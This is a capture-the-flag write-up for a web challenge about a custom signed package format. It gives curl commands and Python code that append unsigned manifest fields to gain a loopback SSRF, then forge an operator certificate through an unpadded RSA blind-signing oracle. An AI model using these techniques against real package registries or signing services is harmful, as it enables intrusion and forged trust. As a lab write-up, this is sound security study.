# Slipstream Cache

**Category:** Web
**Flag:** `slopped{split_parsers_make_signed_packages_liable}`

## Summary

Slipstream Cache was a package-registry challenge built around a custom `SPK1`
bundle format. The service exposed only a small upload/install UI, so the right
approach was to reverse the downloaded sample package rather than guess hidden
paths.

The bug was a parser split:

- the verifier authenticated only the first `signed_len` bytes of the manifest;
- the installer parsed the full `manifest_len` bytes of the manifest.

By preserving the signed prefix and appending unsigned TLVs, we could turn a
safe package into a loopback fetch package. That exposed an internal blind RSA
signing endpoint, which was then used to forge an operator certificate for the
internal flag endpoint.

## Files

This folder contains the handout artifact and a working reproduction script:

- [`sample.spk`](sample.spk): sample package downloaded from `/public/sample`
- [`exploit.py`](exploit.py): end-to-end solver using only Python standard
  library modules
- [`artifacts.md`](artifacts.md): artifact notes and hash

The sample hash is:

```text
cccff729431bb2aa3e4b047a51464d54dc5c4ade603acd655c109bc98fc139fc  sample.spk
```

## 1. Get the Sample Package

The web page linked a public sample package:

```bash
curl -sS http://178.105.199.41:20024/public/sample -o sample.spk
```

The first bytes already show that this is not an archive format we should throw
at generic tools:

```bash
xxd -g1 -l 160 sample.spk
```

Important bytes from the start:

```text
00000000: 53 50 4b 31 01 1b 43 52 54 31 01 0d 73 61 6d 70  SPK1..CRT1..samp
00000010: 6c 65 2d 76 65 6e 64 6f 72 00 80 bc a5 c1 11 d9  le-vendor.......
```

The top-level package starts with `SPK1`. Inside it is a `CRT1` certificate for
`sample-vendor`.

## 2. Upload the Unmodified Package

Uploading the sample gives a very useful verifier transcript:

```bash
curl -sS -F package=@sample.spk \
  http://178.105.199.41:20024/api/upload
```

The response includes:

```json
{
  "kid": "13889c7a",
  "role": "public",
  "signed_view": {
    "cmd": "static",
    "name": "lantern"
  },
  "verifier": "vendor=sample-vendor\nrole=public\nkid=13889c7a\nsigned_len=19 manifest_len=32\nname=lantern\ncmd=static\n..."
}
```

The two length fields are the key:

```text
signed_len=19
manifest_len=32
```

The package is not signing the whole manifest.

## 3. Reverse the Package Layout

The useful layout of the sample package is:

| Offset | Field |
| --- | --- |
| `0x000` | `SPK1` magic |
| `0x006` | `CRT1` certificate body starts |
| `0x00a` | certificate role/class byte |
| `0x09f` | certificate signature length starts |
| `0x121` | package `signed_len` |
| `0x123` | package `manifest_len` |
| `0x125` | manifest starts |
| `0x145` | package signature length starts in the sample |

The manifest begins at `0x125` and is TLV encoded:

```text
01 0007 6c616e7465726e        tag 1: name = "lantern"
02 0006 737461746963          tag 2: cmd  = "static"
04 000a 63616368652d7761726d  tag 4:      = "cache-warm"
```

The first two TLVs are exactly 19 bytes:

```text
01 0007 "lantern"  -> 10 bytes
02 0006 "static"   ->  9 bytes
total              -> 19 bytes
```

That matches `signed_len=19`. The verifier authenticates and displays only those
19 bytes, but the installer uses `manifest_len=32` and therefore parses the
extra `tag 4` field as well.

This short parser script is enough to confirm the boundary:

```python
from pathlib import Path

b = Path("sample.spk").read_bytes()
signed_len = int.from_bytes(b[0x121:0x123], "big")
manifest_len = int.from_bytes(b[0x123:0x125], "big")
manifest = b[0x125:0x125 + manifest_len]

print(signed_len, manifest_len)

p = 0
while p < len(manifest):
    tag = manifest[p]
    ln = int.from_bytes(manifest[p + 1:p + 3], "big")
    val = manifest[p + 3:p + 3 + ln]
    print(tag, ln, val)
    p += 3 + ln
```

Output:

```text
19 32
1 7 b'lantern'
2 6 b'static'
4 10 b'cache-warm'
```

## 4. Abuse `signed_len`

Because the package signature covers only the first 19 manifest bytes, we can
keep the original signed prefix and package signature. The only field we need to
change is `manifest_len`, then append more TLVs before the signature block.

The sample's original manifest is 32 bytes. If we append:

```text
02 0005 "fetch"
```

the verifier still reports the signed view as `cmd=static`, but the installer
tries to run the last command it parsed. Wrong command names returned:

```text
unsupported runtime command
```

The command `fetch` returned a different error:

```text
runtime url must stay on loopback
```

That proved `fetch` was a real runtime command, but it required a loopback URL.
Testing tags showed that URL is tag `03`.

The useful unsigned suffix is therefore:

```text
02 0005 "fetch"
03 001c "http://127.0.0.1:20024/internal/"
```

After uploading and installing that forged package, the service fetches the
loopback URL and returns the body in the install log.

## 5. Discover the Internal API

Using `cmd=fetch` against `/internal/` returns:

```text
maintenance routes:
- /internal/blind-sign?role=operator&blinded=<hex>
- /internal/flag?cert=<b64>&sig=<b64>
```

Those routes are not directly reachable from the public interface. The forged
package is the SSRF primitive needed to talk to them.

The fetch package is also useful as a generic helper:

```python
def tlv(tag, value):
    raw = value.encode()
    return bytes([tag]) + len(raw).to_bytes(2, "big") + raw

def package_with_fetch(sample, target_url):
    manifest_len = int.from_bytes(sample[0x123:0x125], "big")
    manifest_end = 0x125 + manifest_len
    manifest = sample[0x125:manifest_end]
    sig_block = sample[manifest_end:]

    forged_manifest = manifest + tlv(2, "fetch") + tlv(3, target_url)
    forged = bytearray(sample)
    forged[0x123:0x125] = len(forged_manifest).to_bytes(2, "big")
    return bytes(forged[:0x125] + forged_manifest + sig_block)
```

## 6. Understand the Certificate Signature

The package certificate starts at offset `0x006`. The certificate body runs until
offset `0x09f`, followed by a two-byte signature length and a 128-byte RSA
signature:

```text
cert_body = sample[0x006:0x09f]
cert_sig  = sample[0x0a1:0x121]
```

Calling the blind signer with `blinded=01` returns the CA public key:

```text
/internal/blind-sign?role=operator&blinded=01
```

The response includes `n`, `e`, and a signed value. With that public key, the
sample certificate verifies as:

```python
pow(int.from_bytes(cert_sig, "big"), e, n) == int.from_bytes(
    sha256(cert_body).digest(), "big"
)
```

There is no certificate padding. The CA signs the raw SHA-256 digest interpreted
as an integer. That makes the endpoint a true blind signing oracle.

## 7. Find the Operator Role Byte

The byte at absolute package offset `0x0a` is the certificate role/class byte.
In `cert_body` itself, that is offset `0x04`.

The sample has:

```text
43 52 54 31 01 0d ...
CRT1       ^^ role/class = 1
```

Role `1` is public. If we change that byte and re-sign the certificate body,
uploads fail with:

```text
only public vendor packages may be uploaded
```

That error is actually helpful: it means the modified certificate is valid, but
the upload endpoint refuses non-public package certificates. The internal flag
route, however, is specifically asking for an operator certificate.

Role byte `2` is the operator role.

## 8. Blind-Sign an Operator Certificate

To mint the operator certificate without knowing the CA private key:

1. Copy `cert_body = sample[0x006:0x09f]`.
2. Change `cert_body[0x04]` from `1` to `2`.
3. Compute `m = SHA256(cert_body)` as an integer.
4. Choose random `r` with `gcd(r, n) == 1`.
5. Send `blinded = m * r^e mod n` to the internal blind signer.
6. Receive `signed_blinded`.
7. Compute `sig = signed_blinded * r^-1 mod n`.

The result satisfies:

```python
pow(sig, e, n) == int.from_bytes(sha256(cert_body).digest(), "big")
```

The flag endpoint expects both:

```text
cert = base64(cert_body || uint16(128) || sig)
sig  = base64(sig)
```

## 9. Recover the Flag

The final request is made through the same forged fetch package:

```text
http://127.0.0.1:20024/internal/flag?cert=<b64>&sig=<b64>
```

With the role byte set to `2` and a valid unblinded CA signature, the response is:

```text
slopped{split_parsers_make_signed_packages_liable}
```

## End-to-End Reproduction

From the repository root:

```bash
cd web/slipstream-cache
python3 exploit.py http://178.105.199.41:20024
```

Expected output:

```text
maintenance routes:
- /internal/blind-sign?role=operator&blinded=<hex>
- /internal/flag?cert=<b64>&sig=<b64>

slopped{split_parsers_make_signed_packages_liable}
```

The solver performs these steps:

1. Load `sample.spk`.
2. Append unsigned `cmd=fetch` and URL TLVs after the signed manifest prefix.
3. Use the resulting install-time fetch as a loopback SSRF primitive.
4. Read `/internal/`.
5. Query `/internal/blind-sign` for the CA public key.
6. Modify the `CRT1` role byte to `2`.
7. Blind `SHA256(modified_cert_body)`.
8. Ask the internal signer to sign the blinded integer.
9. Unblind the result.
10. Call `/internal/flag` with the signed operator certificate.

## Why It Worked

The package signature was not enough because different components trusted
different lengths. The verifier made its security decision from `signed_len`,
while the installer acted on `manifest_len`. Once the unsigned part of the
manifest controlled the runtime command, the package installer became a
loopback-only HTTP client. The internal signer then completed the chain because
it signed raw RSA digest representatives, allowing a normal blind-signature
unblinding step to produce a valid operator certificate.
